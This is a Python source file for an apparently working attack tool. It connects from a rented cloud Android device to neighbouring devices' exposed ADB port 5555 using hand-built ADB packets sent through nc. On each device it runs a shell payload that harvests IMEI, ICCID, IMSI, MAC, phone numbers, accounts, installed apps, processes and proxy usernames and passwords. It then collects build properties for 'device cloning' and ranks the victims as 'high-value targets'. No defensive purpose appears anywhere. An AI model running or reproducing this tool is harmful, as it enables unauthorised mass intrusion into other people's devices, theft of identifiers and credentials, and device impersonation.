#!/usr/bin/env python3
"""
Mass Neighbor Extraction v2.0
==============================
FIXES from v1:
  - LABELED output (echo KEY=$(cmd)) instead of positional indexing
  - Parser matches on KEY= prefixes — empty getprop values never shift fields
  - Adds: IMEI, ICCID, IMSI, MAC, locale, SELinux, running processes,
    accounts, build type/tags, security patch, device/name/board
  - Adds ==PROPS== section: full ro.* dump for device cloning
  - Better proxy detection and reporting

ADB protocol pattern (proven across 5+ manual extractions):
  1. Push 31-byte CNXN + variable OPEN packet via base64 → device
  2. async_adb_cmd fires nc pipeline to target:5555
  3. Wait for completion, read output via sync_cmd
  4. Parse labeled sections into structured JSON
"""

import asyncio
import struct
import base64
import json
import time
import sys
import os
import re

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ─── Config ───────────────────────────────────────────────────────────
PAD_CODE = "APP5BJ4LRVRJFJQR"  # Virtual Android 16 (extraction platform)
AK = "YOUR_VMOS_AK_HERE"
SK = "YOUR_VMOS_SK_HERE"
BASE_URL = "https://api.vmoscloud.com"

BATCH_SIZE = 6          # concurrent nc extractions per wave
RATE_SPACING = 3.0      # seconds between API calls
NC_TIMEOUT = 12         # nc timeout per target
SHELL_SLEEP = 8         # sleep inside nc pipeline for data collection
WAIT_AFTER_FIRE = 18    # wait after firing batch before reading results
WORK_DIR = "/data/local/tmp/mass2"

# ─── v2 Labeled Extraction Command ────────────────────────────────────
# Every value prefixed with KEY= so empty getprop never shifts fields
EXTRACTION_CMD_V2 = (
    "echo ==ID==;"
    "echo MODEL=$(getprop ro.product.model);"
    "echo BRAND=$(getprop ro.product.brand);"
    "echo MFR=$(getprop ro.product.manufacturer);"
    "echo FP=$(getprop ro.build.fingerprint);"
    "echo SERIAL=$(getprop ro.serialno);"
    "echo ANDROID=$(getprop ro.build.version.release);"
    "echo SDK=$(getprop ro.build.version.sdk);"
    "echo TZ=$(getprop persist.sys.timezone);"
    "echo DISPID=$(getprop ro.build.display.id);"
    "echo LOCALE=$(getprop persist.sys.locale);"
    "echo SELINUX=$(getenforce 2>/dev/null);"
    "echo DEVICE=$(getprop ro.product.device);"
    "echo PRODNAME=$(getprop ro.product.name);"
    "echo BOARD=$(getprop ro.product.board);"
    "echo HW=$(getprop ro.hardware);"
    "echo PLAT=$(getprop ro.board.platform);"
    "echo FIRSTAPI=$(getprop ro.product.first_api_level);"
    "echo SECPATCH=$(getprop ro.build.version.security_patch);"
    "echo BTYPE=$(getprop ro.build.type);"
    "echo BTAGS=$(getprop ro.build.tags);"
    "echo ==PROXY==;"
    "echo HTTPPROXY=$(settings get global http_proxy 2>/dev/null);"
    "echo PROXYHOST=$(getprop http.proxyHost);"
    "echo PROXYPORT=$(getprop http.proxyPort);"
    "echo CLOUDPROXY=$(getprop ro.sys.cloud.proxy.data);"
    "echo ==IDENTITY==;"
    "echo IMEI=$(getprop persist.sys.cloud.imeinum);"
    "echo ICCID=$(getprop persist.sys.cloud.iccidnum);"
    "echo IMSI=$(getprop persist.sys.cloud.imsinum);"
    "echo MAC=$(cat /sys/class/net/wlan0/address 2>/dev/null || cat /sys/class/net/eth0/address 2>/dev/null);"
    "echo ==SIM==;"
    "echo OPALPHA=$(getprop gsm.sim.operator.alpha);"
    "echo OPERATOR=$(getprop gsm.operator.alpha);"
    "echo MCCMNC=$(getprop gsm.sim.operator.numeric);"
    "echo OPNUM=$(getprop gsm.operator.numeric);"
    "echo ==NET==;"
    "ip route show default 2>/dev/null | head -3;"
    "ip addr show wlan0 2>/dev/null | grep inet | head -2;"
    "ip addr show eth0 2>/dev/null | grep inet | head -2;"
    "echo ==APPS==;"
    "pm list packages -3 2>/dev/null | head -80;"
    "echo ==PROCS==;"
    "ps -A 2>/dev/null | awk '{print $NF}' | sort -u | grep -v '\\[' | grep -v NAME | head -60;"
    "echo ==ACCTS==;"
    "dumpsys account 2>/dev/null | grep -E 'Account \\{|name=' | head -20;"
    "echo ==PROPS==;"
    "echo P_ODMFP=$(getprop ro.odm.build.fingerprint);"
    "echo P_VNDFP=$(getprop ro.vendor.build.fingerprint);"
    "echo P_SYSFP=$(getprop ro.system.build.fingerprint);"
    "echo P_SEFP=$(getprop ro.system_ext.build.fingerprint);"
    "echo P_PRDFP=$(getprop ro.product.build.fingerprint);"
    "echo P_INCR=$(getprop ro.build.version.incremental);"
    "echo P_FLAV=$(getprop ro.build.flavor);"
    "echo P_BSER=$(getprop ro.boot.serialno);"
    "echo P_BHW=$(getprop ro.boot.hardware);"
    "echo P_BVBS=$(getprop ro.boot.verifiedbootstate);"
    "echo P_BFLK=$(getprop ro.boot.flash.locked);"
    "echo P_BVDS=$(getprop ro.boot.vbmeta.device_state);"
    "echo P_SOCM=$(getprop ro.soc.manufacturer);"
    "echo P_SOCMOD=$(getprop ro.soc.model);"
    "echo P_HWCN=$(getprop ro.hardware.chipname);"
    "echo P_CPHONE=$(getprop persist.sys.cloud.phonenum);"
    "echo P_CWSSID=$(getprop persist.sys.cloud.wifi.ssid);"
    "echo P_CWMAC=$(getprop persist.sys.cloud.wifi.mac);"
    "echo P_CDRMID=$(getprop persist.sys.cloud.drm.id);"
    "echo P_CPUID=$(getprop persist.sys.cloud.drm.puid);"
    "echo P_CGLV=$(getprop persist.sys.cloud.gpu.gl_vendor);"
    "echo P_CGLR=$(getprop persist.sys.cloud.gpu.gl_renderer);"
    "echo P_CGLVER=$(getprop persist.sys.cloud.gpu.gl_version);"
    "echo P_CBCAP=$(getprop persist.sys.cloud.battery.capacity);"
    "echo P_CBLVL=$(getprop persist.sys.cloud.battery.level);"
    "echo P_CINST=$(getprop persist.sys.cloud.pm.install_source);"
    "echo ==DONE=="
)


def mk_adb_pkt(cmd_str: str, arg0: int, arg1: int, data: bytes = b"") -> bytes:
    CMD_MAP = {
        "CNXN": 0x4E584E43, "OPEN": 0x4E45504F,
        "WRTE": 0x45545257, "CLSE": 0x45534C43, "OKAY": 0x59414B4F,
    }
    cmd_int = CMD_MAP[cmd_str]
    checksum = sum(data) & 0xFFFFFFFF
    magic = cmd_int ^ 0xFFFFFFFF
    header = struct.pack("<6I", cmd_int, arg0, arg1, len(data), checksum, magic)
    return header + data


def build_cnxn_packet() -> bytes:
    return mk_adb_pkt("CNXN", 0x01000001, 0x00040000, b"host::\x00")


def build_open_packet(shell_cmd: str) -> bytes:
    return mk_adb_pkt("OPEN", 1, 0, f"shell:{shell_cmd}\x00".encode())


def parse_labeled(lines: list[str]) -> dict:
    """Parse KEY=VALUE lines into dict. Empty values produce empty strings (not missing)."""
    result = {}
    for line in lines:
        if "=" in line:
            key, _, value = line.partition("=")
            key = key.strip()
            value = value.strip()
            if key and key.isalpha():
                result[key] = value
    return result


def parse_getprop_lines(lines: list[str]) -> dict:
    """Parse [key]: [value] format from getprop output."""
    props = {}
    for line in lines:
        m = re.match(r"\[([^\]]+)\]:\s*\[([^\]]*)\]", line)
        if m:
            props[m.group(1)] = m.group(2)
    return props


def parse_extraction_v2(raw_text: str, target_ip: str) -> dict:
    """Parse v2 labeled output into structured data."""
    result = {
        "ip": target_ip,
        "status": "FAILED",
        # Identity
        "model": "", "brand": "", "manufacturer": "", "fingerprint": "",
        "serial": "", "android_version": "", "sdk": "", "timezone": "",
        "display_id": "", "locale": "", "selinux": "",
        "device": "", "product_name": "", "board": "", "hardware": "",
        "platform": "", "first_api_level": "", "security_patch": "",
        "build_type": "", "build_tags": "",
        # Proxy
        "proxy": {
            "http_proxy": "", "proxy_host": "", "proxy_port": "",
            "cloud_proxy_data": "", "parsed": None, "has_active_proxy": False,
        },
        # Identity hardware
        "imei": "", "iccid": "", "imsi": "", "mac": "",
        # SIM
        "sim": {"operator_alpha": "", "operator": "", "mcc_mnc": "", "operator_numeric": ""},
        # Network
        "network": {"routes": [], "wlan0": [], "eth0": []},
        # Apps + processes
        "apps": [], "running_processes": [], "accounts": [],
        # Full property dump for cloning
        "clone_properties": {},
        # Meta
        "raw_bytes": 0, "adb_banner": "",
    }

    if not raw_text or "==ID==" not in raw_text:
        return result

    # Extract ADB banner
    for line in raw_text.split("\n"):
        if "ro.product.name=" in line or "ro.product.model=" in line:
            result["adb_banner"] = line.strip()
            break

    # Split into sections
    sections = {}
    current_section = None
    current_lines = []

    for line in raw_text.split("\n"):
        line_s = line.strip()
        if line_s.startswith("==") and line_s.endswith("=="):
            if current_section:
                sections[current_section] = current_lines
            current_section = line_s.strip("=")
            current_lines = []
        elif current_section:
            # Filter ADB protocol noise
            if line_s and line_s not in ("WRTE", "CLSE", "OKAY"):
                current_lines.append(line_s)

    if current_section:
        sections[current_section] = current_lines

    # ── Parse ID section (labeled) ──
    id_data = parse_labeled(sections.get("ID", []))
    field_map = {
        "MODEL": "model", "BRAND": "brand", "MFR": "manufacturer",
        "FP": "fingerprint", "SERIAL": "serial", "ANDROID": "android_version",
        "SDK": "sdk", "TZ": "timezone", "DISPID": "display_id",
        "LOCALE": "locale", "SELINUX": "selinux", "DEVICE": "device",
        "PRODNAME": "product_name", "BOARD": "board", "HW": "hardware",
        "PLAT": "platform", "FIRSTAPI": "first_api_level",
        "SECPATCH": "security_patch", "BTYPE": "build_type", "BTAGS": "build_tags",
    }
    for key, field in field_map.items():
        if key in id_data:
            result[field] = id_data[key]

    # ── Parse PROXY section (labeled) ──
    proxy_data = parse_labeled(sections.get("PROXY", []))
    proxy_map = {
        "HTTPPROXY": "http_proxy", "PROXYHOST": "proxy_host",
        "PROXYPORT": "proxy_port", "CLOUDPROXY": "cloud_proxy_data",
    }
    for key, field in proxy_map.items():
        if key in proxy_data:
            val = proxy_data[key]
            # Clean "null" responses from settings
            if val.lower() in ("null", "none", ""):
                val = ""
            result["proxy"][field] = val

    # Parse cloud proxy data (IP|port|user|pass|enable)
    cpd = result["proxy"]["cloud_proxy_data"]
    if cpd and "|" in cpd:
        parts = cpd.split("|")
        if len(parts) >= 5 and parts[0]:
            result["proxy"]["parsed"] = {
                "ip": parts[0], "port": parts[1],
                "user": parts[2], "pass": parts[3],
                "enabled": parts[4],
            }
            result["proxy"]["has_active_proxy"] = parts[4].lower() == "true" and parts[0] != ""

    # Also check if proxy_host has proxy data (in case of non-cloud devices)
    if not result["proxy"]["has_active_proxy"]:
        ph = result["proxy"]["proxy_host"]
        if ph and "|" in ph:
            parts = ph.split("|")
            if len(parts) >= 5 and parts[0]:
                result["proxy"]["parsed"] = {
                    "ip": parts[0], "port": parts[1],
                    "user": parts[2], "pass": parts[3],
                    "enabled": parts[4],
                }
                result["proxy"]["has_active_proxy"] = parts[4].lower() == "true"
                result["proxy"]["cloud_proxy_data"] = ph  # Normalize

    # ── Parse IDENTITY section (labeled) ──
    ident_data = parse_labeled(sections.get("IDENTITY", []))
    result["imei"] = ident_data.get("IMEI", "")
    result["iccid"] = ident_data.get("ICCID", "")
    result["imsi"] = ident_data.get("IMSI", "")
    result["mac"] = ident_data.get("MAC", "")

    # ── Parse SIM section (labeled) ──
    sim_data = parse_labeled(sections.get("SIM", []))
    sim_map = {
        "OPALPHA": "operator_alpha", "OPERATOR": "operator",
        "MCCMNC": "mcc_mnc", "OPNUM": "operator_numeric",
    }
    for key, field in sim_map.items():
        if key in sim_data:
            result["sim"][field] = sim_data[key]

    # ── Parse NET section (raw lines) ──
    for line in sections.get("NET", []):
        if "wlan0" in line and "inet" in line:
            result["network"]["wlan0"].append(line)
        elif "eth0" in line and ("inet" in line or "src" in line):
            result["network"]["eth0"].append(line)
        elif "default" in line or "dev" in line:
            result["network"]["routes"].append(line)

    # ── Parse APPS section ──
    for line in sections.get("APPS", []):
        pkg = line.replace("package:", "").strip()
        if pkg and not pkg.startswith("=="):
            result["apps"].append(pkg)

    # ── Parse PROCS section ──
    for line in sections.get("PROCS", []):
        proc = line.strip()
        if proc and not proc.startswith("==") and proc not in ("NAME",):
            result["running_processes"].append(proc)

    # ── Parse ACCTS section ──
    for line in sections.get("ACCTS", []):
        line_s = line.strip()
        if line_s and "Account" in line_s:
            result["accounts"].append(line_s)
        elif "name=" in line_s:
            result["accounts"].append(line_s)

    # ── Parse PROPS section (labeled clone properties) ──
    props_data = parse_labeled(sections.get("PROPS", []))
    # Map labeled keys to actual property names
    props_key_map = {
        "P_ODMFP": "ro.odm.build.fingerprint",
        "P_VNDFP": "ro.vendor.build.fingerprint",
        "P_SYSFP": "ro.system.build.fingerprint",
        "P_SEFP": "ro.system_ext.build.fingerprint",
        "P_PRDFP": "ro.product.build.fingerprint",
        "P_INCR": "ro.build.version.incremental",
        "P_FLAV": "ro.build.flavor",
        "P_BSER": "ro.boot.serialno",
        "P_BHW": "ro.boot.hardware",
        "P_BVBS": "ro.boot.verifiedbootstate",
        "P_BFLK": "ro.boot.flash.locked",
        "P_BVDS": "ro.boot.vbmeta.device_state",
        "P_SOCM": "ro.soc.manufacturer",
        "P_SOCMOD": "ro.soc.model",
        "P_HWCN": "ro.hardware.chipname",
        "P_CPHONE": "persist.sys.cloud.phonenum",
        "P_CWSSID": "persist.sys.cloud.wifi.ssid",
        "P_CWMAC": "persist.sys.cloud.wifi.mac",
        "P_CDRMID": "persist.sys.cloud.drm.id",
        "P_CPUID": "persist.sys.cloud.drm.puid",
        "P_CGLV": "persist.sys.cloud.gpu.gl_vendor",
        "P_CGLR": "persist.sys.cloud.gpu.gl_renderer",
        "P_CGLVER": "persist.sys.cloud.gpu.gl_version",
        "P_CBCAP": "persist.sys.cloud.battery.capacity",
        "P_CBLVL": "persist.sys.cloud.battery.level",
        "P_CINST": "persist.sys.cloud.pm.install_source",
    }
    for label, prop_name in props_key_map.items():
        val = props_data.get(label, "")
        if val:
            result["clone_properties"][prop_name] = val

    # Also add ID section properties to clone_properties for completeness
    id_to_prop = {
        "model": "ro.product.model", "brand": "ro.product.brand",
        "manufacturer": "ro.product.manufacturer", "fingerprint": "ro.build.fingerprint",
        "serial": "ro.serialno", "android_version": "ro.build.version.release",
        "sdk": "ro.build.version.sdk", "display_id": "ro.build.display.id",
        "device": "ro.product.device", "product_name": "ro.product.name",
        "board": "ro.product.board", "hardware": "ro.hardware",
        "platform": "ro.board.platform", "first_api_level": "ro.product.first_api_level",
        "security_patch": "ro.build.version.security_patch",
        "build_type": "ro.build.type", "build_tags": "ro.build.tags",
        "timezone": "persist.sys.timezone", "locale": "persist.sys.locale",
        "imei": "persist.sys.cloud.imeinum", "iccid": "persist.sys.cloud.iccidnum",
        "imsi": "persist.sys.cloud.imsinum", "mac": "persist.sys.cloud.wifi.mac",
    }
    for field, prop_name in id_to_prop.items():
        val = result.get(field, "")
        if val and prop_name not in result["clone_properties"]:
            result["clone_properties"][prop_name] = val

    # ── Mark success ──
    if result["model"]:
        result["status"] = "OK"

    return result


class MassExtractorV2:
    def __init__(self, batch_size=BATCH_SIZE):
        self.client = VMOSCloudClient(AK, SK, BASE_URL)
        self.batch_size = batch_size
        self.results = []
        self.stats = {
            "total_targets": 0, "successful": 0, "failed": 0,
            "with_proxy": 0, "with_apps": 0, "with_processes": 0,
            "with_accounts": 0, "with_clone_props": 0,
            "api_calls": 0, "start_time": 0, "end_time": 0,
        }

    async def _api_call(self, coro):
        await asyncio.sleep(RATE_SPACING)
        self.stats["api_calls"] += 1
        return await coro

    async def nsh(self, cmd: str) -> str:
        r = await self._api_call(
            self.client.sync_cmd(
                pad_code=PAD_CODE,
                command=f"nsenter -t 1 -m -u -i -n -p -- sh -c '{cmd}'",
                timeout_sec=30,
            )
        )
        d = r.get("data", {})
        if isinstance(d, list) and d:
            e = d[0]
            return (e.get("errorMsg", "") or "").strip() if isinstance(e, dict) else str(e)
        return str(d)

    async def fire(self, cmd: str):
        return await self._api_call(self.client.async_adb_cmd([PAD_CODE], cmd))

    async def setup(self):
        print("[SETUP] Creating work directory and pushing v2 packets...")
        await self.nsh(f"mkdir -p {WORK_DIR}")

        # Ensure cn.bin exists
        cn_exists = await self.nsh("test -f /data/local/tmp/cn.bin && echo YES || echo NO")
        if "YES" not in cn_exists:
            cn_pkt = build_cnxn_packet()
            cn_b64 = base64.b64encode(cn_pkt).decode()
            await self.nsh(f"echo -n '{cn_b64}' | base64 -d > /data/local/tmp/cn.bin")
            print(f"  Pushed cn.bin ({len(cn_pkt)} bytes)")
        else:
            print("  cn.bin already exists")

        # Build and push v2 extraction OPEN packet
        op_pkt = build_open_packet(EXTRACTION_CMD_V2)
        op_b64 = base64.b64encode(op_pkt).decode()
        await self.nsh(f"echo -n '{op_b64}' | base64 -d > {WORK_DIR}/op_v2.bin")
        print(f"  Pushed op_v2.bin ({len(op_pkt)} bytes)")
        return True

    async def get_targets(self, target_list=None, scan_file_local=None):
        if target_list:
            return target_list

        raw = ""
        if scan_file_local:
            print(f"[SCAN] Reading targets from local file: {scan_file_local}")
            with open(scan_file_local) as f:
                raw = f.read()
        else:
            print("[SCAN] Reading known neighbors from scan_results.txt...")
            raw = await self.nsh("cat /data/local/tmp/scan_results.txt 2>/dev/null | head -700")

        # Get our IP to exclude
        our_info = await self.nsh("ip -4 addr show eth0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1")
        our_ip = our_info.strip().split("\n")[0].strip()
        print(f"  Our IP: {our_ip}")

        targets = []
        for line in raw.split("\n"):
            line = line.strip()
            if not line:
                continue
            ip = None
            if line.startswith("ADB:"):
                parts = line.split(":")
                if len(parts) >= 2:
                    ip = parts[1]
            else:
                candidate = line.split()[0] if " " in line else line
                ip = candidate
            if ip:
                octets = ip.split(".")
                if len(octets) == 4 and all(o.isdigit() and 0 <= int(o) <= 255 for o in octets):
                    if ip != our_ip:
                        targets.append(ip)

        targets = list(dict.fromkeys(targets))
        print(f"  Found {len(targets)} unique targets (excluding self)")
        return targets

    async def fire_extraction_batch(self, targets: list[str], batch_offset: int):
        for i, ip in enumerate(targets):
            idx = batch_offset + i
            nc_cmd = (
                f"nsenter -t 1 -m -u -i -n -p -- sh -c '"
                f"{{ cat /data/local/tmp/cn.bin; sleep 0.3; cat {WORK_DIR}/op_v2.bin; sleep {SHELL_SLEEP}; }} "
                f"| timeout {NC_TIMEOUT} nc {ip} 5555 > {WORK_DIR}/{idx}_raw.bin 2>/dev/null; "
                f"strings {WORK_DIR}/{idx}_raw.bin > {WORK_DIR}/{idx}_out.txt'"
            )
            await self.fire(nc_cmd)
            print(f"  [{idx}] Fired → {ip}")

    async def collect_batch_results(self, targets: list[str], batch_offset: int) -> list[dict]:
        batch_results = []
        for i, ip in enumerate(targets):
            idx = batch_offset + i
            text = await self.nsh(f"cat {WORK_DIR}/{idx}_out.txt 2>/dev/null")
            raw_sz = await self.nsh(f"wc -c < {WORK_DIR}/{idx}_raw.bin 2>/dev/null || echo 0")

            parsed = parse_extraction_v2(text, ip)
            try:
                parsed["raw_bytes"] = int(raw_sz.strip())
            except ValueError:
                parsed["raw_bytes"] = 0
            parsed["batch_index"] = idx
            batch_results.append(parsed)

            s = "✓" if parsed["status"] == "OK" else "✗"
            m = parsed["model"] or "NO_RESPONSE"
            a = len(parsed["apps"])
            p = len(parsed["running_processes"])
            proxy_str = ""
            if parsed["proxy"]["has_active_proxy"]:
                pp = parsed["proxy"].get("parsed", {})
                proxy_str = f"{pp.get('ip','')}:{pp.get('port','')}"
            cp = len(parsed["clone_properties"])
            print(f"  [{idx}] {s} {ip:16s} {m:22s} Apps:{a:2d} Procs:{p:2d} CloneProps:{cp:3d} Proxy:{proxy_str or 'none'}")

        return batch_results

    async def run(self, target_list=None, max_targets=None, scan_file_local=None):
        self.stats["start_time"] = time.time()
        await self.setup()

        targets = await self.get_targets(target_list, scan_file_local)
        if max_targets:
            targets = targets[:max_targets]

        self.stats["total_targets"] = len(targets)
        print(f"\n[EXTRACT v2] Starting mass extraction of {len(targets)} targets")
        print(f"  Batch size: {self.batch_size}, Rate spacing: {RATE_SPACING}s")
        print(f"  NC timeout: {NC_TIMEOUT}s, Wait per batch: {WAIT_AFTER_FIRE}s")
        print()

        all_results = []
        for batch_start in range(0, len(targets), self.batch_size):
            batch = targets[batch_start: batch_start + self.batch_size]
            batch_num = (batch_start // self.batch_size) + 1
            total_batches = (len(targets) + self.batch_size - 1) // self.batch_size
            print(f"── BATCH {batch_num}/{total_batches} ({len(batch)} targets) ──")

            await self.fire_extraction_batch(batch, batch_start)

            wait_secs = WAIT_AFTER_FIRE + (len(batch) * 1)
            print(f"  Waiting {wait_secs}s for pipelines to complete...")
            await asyncio.sleep(wait_secs)

            batch_results = await self.collect_batch_results(batch, batch_start)
            all_results.extend(batch_results)

            ok = sum(1 for r in all_results if r["status"] == "OK")
            prox = sum(1 for r in all_results if r["proxy"]["has_active_proxy"])
            print(f"  Progress: {len(all_results)}/{len(targets)} done, {ok} OK, {prox} proxied\n")

        self.results = all_results
        self.stats["end_time"] = time.time()
        self.stats["successful"] = sum(1 for r in all_results if r["status"] == "OK")
        self.stats["failed"] = sum(1 for r in all_results if r["status"] == "FAILED")
        self.stats["with_proxy"] = sum(1 for r in all_results if r["proxy"]["has_active_proxy"])
        self.stats["with_apps"] = sum(1 for r in all_results if r["apps"])
        self.stats["with_processes"] = sum(1 for r in all_results if r["running_processes"])
        self.stats["with_accounts"] = sum(1 for r in all_results if r["accounts"])
        self.stats["with_clone_props"] = sum(1 for r in all_results if len(r["clone_properties"]) >= 10)

        return self.generate_report()

    def generate_report(self) -> dict:
        elapsed = self.stats["end_time"] - self.stats["start_time"]

        # Rank by value: proxy + apps + processes + clone props
        ranked = sorted(
            [r for r in self.results if r["status"] == "OK"],
            key=lambda r: (
                (50 if r["proxy"]["has_active_proxy"] else 0)
                + len(r["apps"]) * 2
                + len(r["running_processes"])
                + (10 if r["sim"]["operator_alpha"] else 0)
                + (20 if len(r["clone_properties"]) >= 20 else 0)
                + (15 if r["accounts"] else 0)
            ),
            reverse=True,
        )

        by_carrier = {}
        for r in self.results:
            if r["status"] == "OK":
                carrier = r["sim"].get("operator_alpha", "") or "Unknown"
                by_carrier.setdefault(carrier, []).append(r["ip"])

        by_brand = {}
        for r in self.results:
            if r["status"] == "OK":
                brand = r["brand"] or "Unknown"
                by_brand.setdefault(brand, []).append(r["ip"])

        all_apps = {}
        for r in self.results:
            for app in r["apps"]:
                all_apps[app] = all_apps.get(app, 0) + 1
        top_apps = sorted(all_apps.items(), key=lambda x: x[1], reverse=True)[:50]

        all_procs = {}
        for r in self.results:
            for proc in r["running_processes"]:
                all_procs[proc] = all_procs.get(proc, 0) + 1
        top_procs = sorted(all_procs.items(), key=lambda x: x[1], reverse=True)[:50]

        proxy_devices = [r for r in self.results if r["proxy"]["has_active_proxy"]]

        # Clone-ready devices (have 20+ properties extracted)
        clone_ready = [
            r for r in self.results
            if r["status"] == "OK" and len(r["clone_properties"]) >= 20
        ]

        report = {
            "campaign": {
                "version": "v2.0",
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
                "platform_device": PAD_CODE,
                "elapsed_seconds": round(elapsed, 1),
                "api_calls": self.stats["api_calls"],
            },
            "stats": self.stats,
            "by_carrier": by_carrier,
            "by_brand": by_brand,
            "top_apps": top_apps,
            "top_processes": top_procs,
            "proxy_devices": [
                {
                    "ip": r["ip"], "model": r["model"], "brand": r["brand"],
                    "proxy_data": r["proxy"].get("cloud_proxy_data", ""),
                    "proxy_parsed": r["proxy"].get("parsed"),
                    "timezone": r["timezone"],
                    "carrier": r["sim"].get("operator_alpha", ""),
                }
                for r in proxy_devices
            ],
            "clone_ready_devices": [
                {
                    "ip": r["ip"], "model": r["model"], "brand": r["brand"],
                    "android": r["android_version"], "timezone": r["timezone"],
                    "carrier": r["sim"].get("operator_alpha", ""),
                    "clone_props_count": len(r["clone_properties"]),
                    "has_proxy": r["proxy"]["has_active_proxy"],
                    "apps_count": len(r["apps"]),
                    "procs_count": len(r["running_processes"]),
                }
                for r in clone_ready[:30]
            ],
            "ranked_devices": [
                {
                    "ip": r["ip"], "model": r["model"], "brand": r["brand"],
                    "android": r["android_version"], "timezone": r["timezone"],
                    "carrier": r["sim"].get("operator_alpha", ""),
                    "mcc_mnc": r["sim"].get("mcc_mnc", ""),
                    "apps_count": len(r["apps"]),
                    "procs_count": len(r["running_processes"]),
                    "clone_props_count": len(r["clone_properties"]),
                    "proxy": r["proxy"].get("cloud_proxy_data", ""),
                    "has_proxy": r["proxy"]["has_active_proxy"],
                    "imei": r["imei"], "mac": r["mac"],
                    "selinux": r["selinux"],
                    "raw_bytes": r["raw_bytes"],
                }
                for r in ranked
            ],
            "all_results": self.results,
        }
        return report

    def save_report(self, report: dict, filename: str = "mass_extract_v2_report.json"):
        filepath = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
        with open(filepath, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n[REPORT] Saved to {filepath}")

        stats = report["stats"]
        print(f"\n{'='*70}")
        print(f"  MASS EXTRACTION v2 REPORT")
        print(f"{'='*70}")
        print(f"  Targets scanned:     {stats['total_targets']}")
        print(f"  Successful:          {stats['successful']}")
        print(f"  Failed:              {stats['failed']}")
        print(f"  With active proxy:   {stats['with_proxy']}")
        print(f"  With 3rd-party apps: {stats['with_apps']}")
        print(f"  With processes:      {stats['with_processes']}")
        print(f"  With accounts:       {stats['with_accounts']}")
        print(f"  Clone-ready (20+ props): {stats['with_clone_props']}")
        print(f"  API calls:           {stats['api_calls']}")
        elapsed = stats['end_time'] - stats['start_time']
        print(f"  Elapsed:             {elapsed:.0f}s ({elapsed/60:.1f}m)")
        print()

        if report["proxy_devices"]:
            print("  PROXY-ENABLED DEVICES:")
            for pd in report["proxy_devices"]:
                pp = pd.get("proxy_parsed") or {}
                print(f"    {pd['ip']:16s} {pd['model']:22s} → {pp.get('ip','')}:{pp.get('port','')} [{pd.get('timezone','')}]")
            print()

        if report["by_carrier"]:
            print("  CARRIERS:")
            for carrier, ips in sorted(report["by_carrier"].items(), key=lambda x: -len(x[1])):
                print(f"    {carrier}: {len(ips)} devices")
            print()

        if report["by_brand"]:
            print("  BRANDS:")
            for brand, ips in sorted(report["by_brand"].items(), key=lambda x: -len(x[1])):
                print(f"    {brand}: {len(ips)} devices")
            print()

        if report["top_apps"]:
            print("  TOP APPS:")
            for app, count in report["top_apps"][:20]:
                print(f"    {app}: {count} devices")
            print()

        if report["top_processes"]:
            print("  TOP RUNNING PROCESSES:")
            for proc, count in report["top_processes"][:20]:
                print(f"    {proc}: {count} devices")
            print()

        if report["clone_ready_devices"]:
            print("  CLONE-READY DEVICES (20+ props):")
            for i, dev in enumerate(report["clone_ready_devices"][:10], 1):
                proxy_tag = " [PROXIED]" if dev["has_proxy"] else ""
                print(f"    #{i} {dev['ip']:16s} {dev['model']:22s} Props:{dev['clone_props_count']} Apps:{dev['apps_count']}{proxy_tag}")
            print()

        print("  TOP 10 HIGH-VALUE TARGETS:")
        for i, dev in enumerate(report["ranked_devices"][:10], 1):
            proxy_tag = " [PROXY]" if dev["has_proxy"] else ""
            print(f"    #{i} {dev['ip']:16s} {dev['model']:22s} {dev.get('carrier',''):16s} Apps:{dev['apps_count']} Props:{dev['clone_props_count']}{proxy_tag}")

        return filepath


async def main():
    import argparse
    parser = argparse.ArgumentParser(description="Mass neighbor extraction v2 (labeled output)")
    parser.add_argument("--targets", nargs="*", help="Specific IPs to extract")
    parser.add_argument("--max", type=int, default=None, help="Max targets to process")
    parser.add_argument("--output", default="mass_extract_v2_report.json", help="Output filename")
    parser.add_argument("--batch", type=int, default=BATCH_SIZE, help=f"Batch size (default: {BATCH_SIZE})")
    parser.add_argument("--scan-file", default=None, help="Path to file with target IPs")
    args = parser.parse_args()

    extractor = MassExtractorV2(batch_size=args.batch)
    report = await extractor.run(target_list=args.targets, max_targets=args.max, scan_file_local=args.scan_file)
    extractor.save_report(report, args.output)


if __name__ == "__main__":
    asyncio.run(main())
